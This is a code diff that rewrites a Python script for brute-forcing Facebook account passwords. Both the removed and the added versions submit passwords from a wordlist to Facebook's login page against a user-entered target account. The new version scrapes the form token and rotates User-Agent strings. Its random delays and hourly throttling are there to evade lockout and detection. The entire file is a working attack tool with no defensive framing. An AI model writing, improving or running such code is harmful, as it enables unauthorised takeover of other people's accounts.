@@ -1,86 +1,86 @@
-import requests
+import os
+import random
 import time
+import requests
+from bs4 import BeautifulSoup
+import sys
 
-def brute_force_facebook_account(identifier: str, identifier_type: str, password_list: list):
-    """
-    Function to perform a brute force attack on a Facebook account using a list of passwords.
+if sys.version_info[0] != 3:
+    print('\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n\t--------------------------------------')
+    sys.exit()
 
-    Parameters:
-    - identifier: str
-        The identifier (email or user ID) associated with the Facebook account.
-    - identifier_type: str
-        The type of identifier ("email" or "id").
-    - password_list: list
-        A list of passwords to try for the Facebook account.
+PASSWORD_FILE = "passwords.txt"
+MIN_PASSWORD_LENGTH = 6
+POST_URL = 'https://www.facebook.com/login.php'
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
+}
+MAX_ATTEMPTS_PER_HOUR = 5
+ATTEMPT_COUNTER = 0
 
-    Returns:
-    - str or None:
-        Returns the correct password if found, or None if no match is found.
+def create_form():
+    session = requests.Session()
+    data = session.get(POST_URL, headers=HEADERS)
+    soup = BeautifulSoup(data.text, 'html.parser')
+    form = {
+        'lsd': soup.form.input['value'],
+        'email': input('Enter Email/Username to target: ').strip(),
+    }
+    return form, session
 
-    Raises:
-    - ValueError:
-        Raises an error if the identifier, identifier type, or password list is empty.
-    """
+def is_this_a_password(index, password, form, session):
+    global ATTEMPT_COUNTER
 
-    # Checking if the identifier, identifier type, or password list is empty
-    if not identifier or not identifier_type or not password_list:
-        raise ValueError("Identifier, identifier type, or password list cannot be empty.")
+    if ATTEMPT_COUNTER >= MAX_ATTEMPTS_PER_HOUR:
+        print("Reached maximum attempts per hour. Waiting for an hour...")
+        time.sleep(3600)
+        ATTEMPT_COUNTER = 0
 
-    # Iterating through the password list
-    for i, password in enumerate(password_list, start=1):
-        # Adding delay to avoid detection and account lockout
-        time.sleep(5)
+    # Add random delay between attempts
+    time.sleep(random.uniform(1, 3))
 
-        # Building the data payload based on identifier type
-        data = {"email" if identifier_type.lower() == "email" else "id": identifier, "pass": password}
+    # Change User-Agent
+    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
 
-        try:
-            # Sending a POST request to the Facebook login endpoint with the identifier and password
-            response = requests.post("https://www.facebook.com/login.php", data=data)
-            response.raise_for_status()  # Raises an HTTPError for bad responses
+    try:
+        r = session.post(POST_URL, data=form, headers=session.headers)
+    except requests.exceptions.RequestException as e:
+        print(f"Error occurred: {e}")
+        return False
 
-            # Checking if the response contains a specific string indicating a successful login
-            if "Welcome to Facebook" in response.text:
-                return password
+    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
+        with open('temp', 'w') as f:
+            f.write(str(r.content))
+        print(f'\nPassword found is: {password}')
+        return True
+    return False
 
-        except requests.exceptions.HTTPError as errh:
-            print ("HTTP Error:", errh)
+if __name__ == "__main__":
+    print('\n---------- Welcome To Facebook BruteForce ----------\n')
+    if not os.path.isfile(PASSWORD_FILE):
+        print(f"Password file is not exist: {PASSWORD_FILE}")
+        sys.exit(0)
 
-        except requests.exceptions.ConnectionError as errc:
-            print ("Error Connecting:", errc)
+    print(f"Password file selected: {PASSWORD_FILE}")
+    form, session = create_form()
 
-        except requests.exceptions.Timeout as errt:
-            print ("Timeout Error:", errt)
+    with open(PASSWORD_FILE, 'r') as f:
+        password_data = f.read().split("\n")
 
-        except requests.exceptions.RequestException as err:
-            print ("An error occurred:", err)
+    # Add a list of User-Agents
+    USER_AGENTS = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',
+        # ... add more User-Agents ...
+    ]
 
-        print(f"Attempt {i}: No match for password: {password}")
-
-    # If no match is found, return None
-    return None
-
-# Example usage of the brute_force_facebook_account function:
-
-# Get the identifier, identifier type, and password list from the user
-identifier = input("Enter the Facebook identifier (email or user ID): ")
-identifier_type = input("Enter the identifier type ('email' or 'id'): ")
-password_list_path = input("Enter the path to the password list file: ")
-
-# Read the password list from the file
-with open(password_list_path, 'r') as file:
-    passwords = [line.strip() for line in file]
-
-try:
-    result = brute_force_facebook_account(identifier, identifier_type, passwords)
-
-    if result:
-        print(f"Successfully found the password for the Facebook account: {result}")
-    else:
-        print("No match found for the given identifier and password list.")
-except ValueError as ve:
-    print(f"ValueError: {ve}")
-except KeyboardInterrupt:
-    print("Process interrupted by the user.")
-except Exception as e:
-    print(f"An unexpected error occurred: {e}")
+    for index, password in enumerate(password_data):
+        password = password.strip()
+        if len(password) < MIN_PASSWORD_LENGTH:
+            continue
+        print(f"Trying password [{index}]: {password}")
+        form['pass'] = password
+        if is_this_a_password(index, password, form, session):
+            break
+        ATTEMPT_COUNTER += 1
